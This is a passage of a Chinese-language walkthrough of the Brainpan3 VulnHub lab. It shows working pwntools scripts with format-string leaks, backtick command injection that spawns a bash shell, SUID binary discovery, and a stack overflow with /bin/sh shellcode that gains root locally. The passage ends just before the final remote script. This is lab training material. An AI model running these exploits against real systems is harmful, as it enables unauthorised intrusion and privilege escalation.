<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\xff �r\xb7�%\x84\xbf</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: --------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ this is my first report!</span><br><span class="line"></span><br><span class="line">REPORT [this is my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209204930.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [dxyc/yc/&#125;i/vybcd/bu`\x7fbd///]</span><br></pre></td></tr></table></figure>

<p>从文字上看，报告似乎以某种方式进行了加密，并存储在/home/anansi/REPORTS/20200209204930.rep中。用于处理报告的二进制文件位于/ repo目录中，因此进行分析可能很有用，可以在尝试进行逆向工程之前先尝试一些其他的操作。经过几次模糊的尝试以查找缓冲区溢出和命令注入之后，得到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `fuck`</span><br><span class="line"></span><br><span class="line">REPORT [`fuck`s my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: fuck: not found</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205212.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [��������������\xff���\xaf\xaf]</span><br></pre></td></tr></table></figure>

<p>什么？！尝试通过反引号执行命令时，收到命令未找到错误消息。这是否意味着命令执行？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami`my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205443.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [`o`orhlx&gt;ghsru&gt;sdqnsu&gt;&gt;&gt;]</span><br></pre></td></tr></table></figure>

<p>这可能是通过stderr实现的。可以通过管道输出到stderr来接收命令输出吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami &gt;&amp;2`irst report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">anansi</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205645.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [&amp;=&lt;;p=*? =;ppp]</span><br></pre></td></tr></table></figure>

<p>真好！现在有趣的部分，尝试获得一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ `/bin/bash -i &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`/bin/bash -i &gt;&amp;2`eport!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2506): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ $</span><br></pre></td></tr></table></figure>

<p>现在有一个用户shell程序！正常情况下，修改漏洞利用脚本以自动为我获取shell程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本能够成功的获得shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 6851</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REPORT [$(/bin/bash -i &gt;&amp;2)]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2677): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br></pre></td></tr></table></figure>

<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>假设需要进行某种特权提升，寻找SUID二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ $ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/home/reynard/private/cryptor</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br></pre></td></tr></table></figure>

<p>突出显示的二进制文件是/home/neynard/private/cryptor。可以执行该二进制文件吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ $ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 72</span><br><span class="line">drwxr-xr-x 3 anansi anansi  4096 Feb  6 13:09 .</span><br><span class="line">drwxr-xr-x 5 root   root    4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 anansi anansi   490 Feb  9 21:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 anansi anansi   220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 anansi anansi  3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 anansi anansi   675 May 19  2015 .profile</span><br><span class="line">drwxrwxrwx 2 anansi anansi  4096 Feb  9 21:04 REPORTS</span><br><span class="line">-rwxrwxrwx 1 root   dev      314 Feb  6 13:09 brainpan.8.gz</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  5568 Feb  9 21:08 cryptor</span><br><span class="line">-rwxrwxrwx 1 anansi anansi   591 May 21  2015 lapinblanc.txt</span><br><span class="line">-rwxrwxrwx 1 anansi webdev 12316 Feb  6 11:05 msg_admin</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  1104 Feb  6 12:57 rootsploit.py</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  7609 Feb  6 10:19 trixd</span><br></pre></td></tr></table></figure>

<p>将此二进制文件从Brainpan3中提取到本地计算机上。看起来只允许端口8080离开服务器。如果不激活代码存储库（命令2），那么通过Python的内置网络服务器提取文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>

<p>在我们的主机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.117:8080/cryptor</span><br></pre></td></tr></table></figure>

<p>加密二进制文件的快速完整性检查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec cryptor</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/cryptor&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>没有canary，也没有NX。这意味着，假设发现缓冲区溢出，可以跳回到堆栈/堆上的shellcode并从那里执行payload，从而避免ROP或其他恶作剧。查看IDA中的二进制文件，可以看到缓冲区溢出情况。看到分配了100个字节的缓冲区。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff1.png"></p>
<p>然后检查第一个参数（argv [1]）是否小于或等于116个字节。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff2.png"></p>
<p>在这里，给出了将116个字节写入100字节缓冲区的情况，有可能导致溢出。有了这些知识，对其进行动态测试。打开启用了Pwndbg的gdb ./cryptor，然后将116字节的字符串与第二个垃圾字符串扔到crytor上。使用Binjitsu创建116字节的循环字符串，以帮助查明字符串溢出的位置。从静态分析中知道了应该是什么，但是拥有多个数据点总是很好。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; cyclic(116)</span><br><span class="line"><span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用116字节字符串运行二进制文件。</p>
<p>遇到崩溃</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">[+] saving to aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616162 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line"> EIP  0x61616162 (<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x61616162</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">01:0004│      0xffffd20c ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">02:0008│      0xffffd210 ◂— <span class="string">&#x27;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">03:000c│      0xffffd214 ◂— <span class="string">&#x27;faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">04:0010│      0xffffd218 ◂— <span class="string">&#x27;gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">05:0014│      0xffffd21c ◂— <span class="string">&#x27;haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">06:0018│      0xffffd220 ◂— <span class="string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">07:001c│      0xffffd224 ◂— <span class="string">&#x27;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 61616162</span><br><span class="line">   f 1 61616163</span><br><span class="line">   f 2 61616164</span><br><span class="line">   f 3 61616165</span><br><span class="line">   f 4 61616166</span><br><span class="line">   f 5 61616167</span><br><span class="line">   f 6 61616168</span><br><span class="line">   f 7 61616169</span><br><span class="line">   f 8 6161616a</span><br><span class="line">   f 9 6161616b</span><br><span class="line">   f 10 6161616c</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616162)</span><br></pre></td></tr></table></figure>

<p>太棒了，所以在循环字符串中的offset baaa崩溃了。让我们通过替换baaa来创建我们的payload，以了解我们拥有EIP的控制权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">&gt;&gt;&gt; shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcode</span><br><span class="line">AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>如果是正确的，应该在EIP中看到BBBB。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">[+] saving to AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x43434343 (<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line"> EIP  0x42424242 (<span class="string">&#x27;BBBB&#x27;</span>) &lt;== 真的非常的牛批！！！</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x42424242</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 42424242</span><br><span class="line">   f 1 43434343</span><br><span class="line">   f 2 43434343</span><br><span class="line">   f 3 43434343</span><br><span class="line">   f 4 43434343</span><br><span class="line">   f 5 43434343</span><br><span class="line">   f 6 43434343</span><br><span class="line">   f 7 43434343</span><br><span class="line">   f 8 43434343</span><br><span class="line">   f 9 43434343</span><br><span class="line">   f 10 43434343</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x42424242)</span><br></pre></td></tr></table></figure>

<p>还从静态分析中注意到，第二个参数存储在位于0x804a080的全局数组中。如果将shellcode写入全局数组，则可以将EIP指向该缓冲区并可能获胜。攻击计划如下：</p>
<ul>
<li>用0x804a080覆盖返回地址BBBB</li>
<li>在第二个参数中删除/bin/sh shellcode以获得一个shell</li>
</ul>
<p>我们得到的测试脚本如下：</p>
<p>test.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;./cryptor&#x27;</span>, shellcode, asm(shellcraft.sh())])</span><br><span class="line"></span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line"></span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line"></span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line"></span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: root&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>成功利用漏洞获取了本地的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python test.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./cryptor&#x27;</span>: pid 20596</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 0&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: root</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>在本地获得了一个shell。现在必须在服务器上执行此命令。为此，在现有脚本中创建命令，然后从脚本中发送命令。该完善后的脚本如下所示：</p>
